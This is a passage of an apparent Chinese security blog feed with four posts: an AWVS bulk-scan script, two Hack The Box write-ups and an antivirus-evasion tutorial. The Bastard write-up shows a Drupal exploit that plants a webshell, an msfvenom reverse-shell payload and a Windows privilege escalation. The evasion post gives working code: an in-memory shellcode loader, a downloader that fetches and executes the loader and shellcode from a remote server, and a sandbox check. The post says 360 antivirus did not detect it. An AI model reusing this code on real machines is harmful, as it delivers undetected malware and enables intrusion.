class="line">Then visit https://YOUR_IP:13443/ <span class="comment"># 这里访问要加https才可以访问</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061633280.png" alt="image-20230706163316215"></p><h2 id="生成apikey"><a href="#生成apikey" class="headerlink" title="生成apikey"></a>生成apikey</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061639410.png" alt="image-20230706163928380"></p><h2 id="脚本批量导入"><a href="#脚本批量导入" class="headerlink" title="脚本批量导入"></a>脚本批量导入</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">apikey = <span class="string">&#x27;1986ad8c0a5b3df4d7...&#x27;</span>  <span class="comment"># API</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&quot;X-Auth&quot;</span>: apikey&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addTask</span>(<span class="params">url, target</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/targets/add&#x27;</span>))</span><br><span class="line">        data = &#123;<span class="string">&quot;targets&quot;</span>: [&#123;<span class="string">&quot;address&quot;</span>: target, <span class="string">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>&#125;], <span class="string">&quot;groups&quot;</span>: []&#125;</span><br><span class="line">        r = requests.post(url, headers=headers, data=json.dumps(data), timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        result = json.loads(r.content.decode())</span><br><span class="line">        <span class="keyword">return</span> result[<span class="string">&#x27;targets&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">url, target, Crawl, user_agent, profile_id, proxy_address, proxy_port</span>):</span><br><span class="line">    scanUrl = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/scans&#x27;</span>))</span><br><span class="line">    target_id = addTask(url, target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> target_id:</span><br><span class="line">        data = &#123;<span class="string">&quot;target_id&quot;</span>: target_id, <span class="string">&quot;profile_id&quot;</span>: profile_id, <span class="string">&quot;incremental&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;schedule&quot;</span>: &#123;<span class="string">&quot;disable&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;start_date&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;time_sensitive&quot;</span>: <span class="literal">False</span>&#125;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            configuration(url, target_id, proxy_address, proxy_port, Crawl, user_agent)</span><br><span class="line">            response = requests.post(scanUrl, data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            result = json.loads(response.content)</span><br><span class="line">            <span class="keyword">return</span> result[<span class="string">&#x27;target_id&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">configuration</span>(<span class="params">url, target_id, proxy_address, proxy_port, Crawl, user_agent</span>):</span><br><span class="line">    configuration_url = <span class="string">&#x27;&#x27;</span>.join((url, <span class="string">&#x27;/api/v1/targets/&#123;0&#125;/configuration&#x27;</span>.<span class="built_in">format</span>(target_id)))</span><br><span class="line">    data = &#123;<span class="string">&quot;scan_speed&quot;</span>: <span class="string">&quot;fast&quot;</span>, <span class="string">&quot;login&quot;</span>: &#123;<span class="string">&quot;kind&quot;</span>: <span class="string">&quot;none&quot;</span>&#125;, <span class="string">&quot;ssh_credentials&quot;</span>: &#123;<span class="string">&quot;kind&quot;</span>: <span class="string">&quot;none&quot;</span>&#125;, <span class="string">&quot;sensor&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;user_agent&quot;</span>: user_agent, <span class="string">&quot;case_sensitive&quot;</span>: <span class="string">&quot;auto&quot;</span>, <span class="string">&quot;limit_crawler_scope&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;excluded_paths&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;authentication&quot;</span>: &#123;<span class="string">&quot;enabled&quot;</span>: <span class="literal">False</span>&#125;,</span><br><span class="line">            <span class="string">&quot;proxy&quot;</span>: &#123;<span class="string">&quot;enabled&quot;</span>: Crawl, <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;http&quot;</span>, <span class="string">&quot;address&quot;</span>: proxy_address, <span class="string">&quot;port&quot;</span>: proxy_port&#125;,</span><br><span class="line">            <span class="string">&quot;technologies&quot;</span>: [], <span class="string">&quot;custom_headers&quot;</span>: [], <span class="string">&quot;custom_cookies&quot;</span>: [], <span class="string">&quot;debug&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;client_certificate_password&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;issue_tracker_id&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;excluded_hours_id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">    r = requests.patch(url=configuration_url, data=json.dumps(data), headers=headers, timeout=<span class="number">30</span>, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Crawl = <span class="literal">True</span></span><br><span class="line">    proxy_address = <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="comment"># docker需要填写物理机ip</span></span><br><span class="line">    proxy_port = <span class="string">&#x27;8080&#x27;</span></span><br><span class="line">    awvs_url = <span class="string">&#x27;https://127.0.0.1:13443&#x27;</span>  <span class="comment"># awvs url</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;C:\x\x\url.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:        <span class="comment">#添加URL路径</span></span><br><span class="line">        targets = f.readlines()</span><br><span class="line">    profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111111&quot;</span></span><br><span class="line">    user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&quot;</span>  <span class="comment"># 扫描默认UA头</span></span><br><span class="line">    <span class="keyword">if</span> Crawl:</span><br><span class="line">        profile_id = <span class="string">&quot;11111111-1111-1111-1111-111111111117&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:</span><br><span class="line">        target = target.strip()</span><br><span class="line">        <span class="keyword">if</span> scan(awvs_url, target, Crawl, user_agent, profile_id, proxy_address, <span class="built_in">int</span>(proxy_port)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125; 添加成功&quot;</span>.<span class="built_in">format</span>(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="添加url"><a href="#添加url" class="headerlink" title="添加url"></a>添加url</h2><p>等待扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307061658937.png" alt="image-20230706165826438"></p><p>开启捡洞模式</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307071039113.png" alt="image-20230707103924039"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307071040056.png" alt="image-20230707104013987"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;burp-配置&quot;&gt;&lt;a href=&quot;#burp-配置&quot; class=&quot;headerlink&quot; title=&quot;burp 配置&quot;&gt;&lt;/a&gt;burp 配置&lt;/h1&gt;&lt;h2 id=&quot;第一层代理配置&quot;&gt;&lt;a href=&quot;#第一层代理配置&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="漏洞挖掘" scheme="https://syst1m.top/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-Bastard</title>
    <link href="https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/"/>
    <id>https://syst1m.top/2023/07/03/htb%E6%89%93%E9%9D%B6-Bastard/</id>
    <published>2023-07-03T03:17:09.000Z</published>
    <updated>2023-07-20T06:23:46.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -O 10.129.10.80          </span><br></pre></td></tr></table></figure><p>开放了80,135,重点显然是在web上面了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031137335.png" alt="image-20230703113702787"></p><p>查看首页,drupal cms<img src="https://raw.githubusercontent.com/chencicici/images/main/202307031138332.png" alt="image-20230703113853299"></p><p>google一下找到专用扫描器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/immunIT/drupwn</span><br></pre></td></tr></table></figure><p>给出了版本7.54但是发现扫不出,换工具!</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031307946.png" alt="image-20230703130700889"></p><h1 id="nday利用"><a href="#nday利用" class="headerlink" title="nday利用"></a>nday利用</h1><p>换searchsploit寻找nday</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031328547.png" alt="image-20230703132821489"></p><p>-m 编号,下载到当前目录,修改对应内容</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340928.png" alt="image-20230703134008900"></p><p>执行发现少一个扩展</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031340450.png" alt="image-20230703134031415"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-curl</span><br></pre></td></tr></table></figure><p>发现利用不成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031349688.png" alt="image-20230703134905651"></p><p>google继续跟进这个exp,找到解释<a href="https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/">https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/</a></p><p>原来还需要找到这个路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031350600.png" alt="image-20230703135030563"></p><p>确认存在,修改exp</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031351923.png" alt="image-20230703135134883"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031352601.png" alt="image-20230703135208562"></p><p>利用成功,返回webshell路径</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031353934.png" alt="image-20230703135327900"></p><p>命令执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307031354170.png" alt="image-20230703135422132"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>为了方便点可以先写个马上线蚁剑(重启后ip变了)</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307181956174.png" alt="image-20230718195638106"></p><p>将靶机上线到msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.31 LPORT=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182018619.png" alt="image-20230718201800576"></p><p>试了几个常用的提权模块,但是提不下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182036797.png" alt="image-20230718203628750"></p><p>下载提权脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rasta-mouse/Sherlock.git</span><br></pre></td></tr></table></figure><p>加载powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br></pre></td></tr></table></figure><p>导入powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_import <span class="string">&#x27;/root/Desktop/Sherlock/Sherlock.ps1&#x27;</span> <span class="comment"># 本地ps脚本路径</span></span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell_execute “find-allvulns”</span><br></pre></td></tr></table></figure><p>或则直接上传上去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -Command <span class="string">&quot;&amp; &#123;Import-Module C:\inetpub\drupal-7.54\Sherlock.ps1;Find-AllVulns&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182059121.png" alt="image-20230718205948075"></p><p>下载exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip</span><br></pre></td></tr></table></figure><p>上传运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182114205.png" alt="image-20230718211429146"></p><p>用system权限去运行后门,返回一个会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182121208.png" alt="image-20230718212140152"></p><p>拿到flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202307182123915.png" alt="image-20230718212311870"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
  </entry>
  
  <entry>
    <title>htb打靶-apt</title>
    <link href="https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/"/>
    <id>https://syst1m.top/2023/06/07/htb%E6%89%93%E9%9D%B6-apt/</id>
    <published>2023-06-07T02:33:24.000Z</published>
    <updated>2023-06-08T06:48:24.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>连接上vpn后的攻击机ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071038755.png" alt="image-20230607103822712"></p><p>ping一下测试靶机是否通</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071039707.png" alt="image-20230607103929681"></p><h2 id="nmap端口信息收集"><a href="#nmap端口信息收集" class="headerlink" title="nmap端口信息收集"></a>nmap端口信息收集</h2><p>同时进行tcp和udp的全端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -p- 10.129.96.60</span><br><span class="line">nmap --min-rate 10000 -p- -sU 10.129.96.60</span><br><span class="line">-sU <span class="comment">#udp扫描</span></span><br><span class="line">--min-rate <span class="comment"># 最小速率</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071052253.png" alt="image-20230607105207228"></p><p>扫描结果中没有udp端口,对tcp端口做进一步扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -p 135,80 -O 10.129.96.60</span><br><span class="line">-sC <span class="comment">#使用默认脚本</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071102490.png" alt="image-20230607110246463"></p><p>继续做漏洞脚本扫描,没东西</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071137113.png" alt="image-20230607113708075"></p><h2 id="web信息收集-无价值-可跳过"><a href="#web信息收集-无价值-可跳过" class="headerlink" title="web信息收集(无价值,可跳过)"></a>web信息收集(无价值,可跳过)</h2><p>访问80端口看看有没有突破口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071107269.png" alt="image-20230607110740223"></p><p>爆一下目录,没发现什么有价值的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.129.96.60 -w /usr/share/dirb/wordlists/common.txt -t 100</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306071112242.png" alt="image-20230607111216208"></p><p>&#x2F;js访问403,继续翻找源码,在源码里找到两个关键信息</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.透露出一个<span class="built_in">ip</span> 但是无法访问</span><br><span class="line"><span class="number">2</span>.透露出这站是由 HTTrack Website Copier这个框架镜像出来的,那么我们对这个网站sql.xss测试都没有用</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081050835.png" alt="image-20230608105053578"></p><p>寻找 HTTrack Website Copier 的相关利用,翻译一下是一个堆栈利用漏洞,没用用处,因为无法直接操作这个应用,继续翻找其他漏洞,也都无法直接利用 </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081100364.png" alt="image-20230608110058331"></p><h2 id="135端口信息收集"><a href="#135端口信息收集" class="headerlink" title="135端口信息收集"></a>135端口信息收集</h2><p>80端口无法利用,把突破口转向135端口</p><p>135端口信息</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081118430.png" alt="image-20230608111838396"></p><p>使用rpcclient尝试连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient 10.129.96.60 -p 135 <span class="comment">#需要指定端口为135,因为rpc默认端口为139</span></span><br></pre></td></tr></table></figure><p>连接失败</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081124189.png" alt="image-20230608112415164"></p><p>使用impacket工具包,先添加环境变量 impacket工具包详解 <a href="https://xz.aliyun.com/t/11877">https://xz.aliyun.com/t/11877</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/share/doc/python3-impacket/examples:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>使用impacket工具包中的rpcdump.py</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202306081448815.png" alt="image-20230608144809783"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Hackthebox名为APT靶机的域渗透，即动态目录渗透，Insane级别即疯狂难度级别&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="hackthebox" scheme="https://syst1m.top/tags/hackthebox/"/>
    
    <category term="域渗透" scheme="https://syst1m.top/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>python bypss 第二弹</title>
    <link href="https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/"/>
    <id>https://syst1m.top/2023/05/16/python-bypss-%E7%AC%AC%E4%BA%8C%E5%BC%B9/</id>
    <published>2023-05-16T08:14:00.000Z</published>
    <updated>2023-05-16T08:54:38.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没什么技术含量,响应群友要求水一篇</p><h1 id="shellcode处理"><a href="#shellcode处理" class="headerlink" title="shellcode处理"></a>shellcode处理</h1><p>生成python的payload</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161623151.png" alt="image-20230516162321944"></p><p>取出shellcode去掉”\x”就是这个样子</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628772.png" alt="image-20230516162821737"></p><p>base64编码一下,当然还可以继续加密,异或或者aes等等,自写加密也行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161628481.png" alt="image-20230516162841455"></p><p>保存为一个,或者多个txt文件,或者图片隐写,都可以,这里只提供一个简单思路</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161630200.png" alt="image-20230516163022164"></p><h1 id="加载器处理"><a href="#加载器处理" class="headerlink" title="加载器处理"></a>加载器处理</h1><p>加载器,就不多说了,shellcode好比子弹,加载器就是手枪,加载器网上到处都是,无非就是申请,读写,执行内存.加载器对于免杀很重要,现在大多数的加载器api都被打上标记了</p><p>提供一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64;rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>);ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),<span class="built_in">len</span>(shellcode));handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>加载器同理shellcode,base64编码一下,也可以继续加密,保存为txt放到服务器上</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161635708.png" alt="image-20230516163518666"></p><h1 id="下载器"><a href="#下载器" class="headerlink" title="下载器"></a>下载器</h1><p>现在写主程序,也就是下载器,我们用这个程序去远程下载加载器和shellcode,只要你服务器不被标记,谁敢说我这是木马??</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes, urllib.request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取shellcode</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">    base64_code = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/shellcode.txt&#x27;</span>).read()</span><br><span class="line">    shellcode = base64.b64decode(base64_code)</span><br><span class="line">    shellcode = <span class="built_in">bytes</span>.fromhex(<span class="built_in">str</span>(shellcode, <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取加载器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_loader</span>():</span><br><span class="line">    base64_loader = urllib.request.urlopen(<span class="string">&#x27;http://x.x.x.x/loader.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64_loader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    shellcode = get_code()</span><br><span class="line">    loader = get_loader()</span><br><span class="line">    <span class="built_in">exec</span>(base64.b64decode(loader))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写个main.py再套个壳,使用import加载调用,再判断下当前路径是否存在这个ok.txt文件,不存在不执行,算是防止被杀软之类的放进沙箱吧,似乎有一点卵用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> loader</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&#x27;ok.txt&#x27;</span>):</span><br><span class="line">    loader.main()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The file does not exist and will not be executed&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h1><p>pyinstaller打包的时候再加密一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161654091.png" alt="image-20230516165426043"></p><p>记得放个ok.txt才会正常运行,正常上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161646454.png" alt="image-20230516164600412"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161645041.png" alt="image-20230516164529002"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>嫌麻烦只测了360</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202305161647480.png" alt="image-20230516164700432"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;没什么技术含量,响应群友要求水一篇&lt;/p&gt;
&lt;h1 id=&quot;shellcode处理&quot;&gt;&lt;a href=&quot;#shellcode处理&quot; clas</summary>
      
    
    
    
    <category term="造轮子" scheme="https://syst1m.top/categories/%E9%80%A0%E8%BD%AE%E5%AD%90/"/>
    
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="bypass" scheme="https://syst1m.top/tags/bypass/"/>
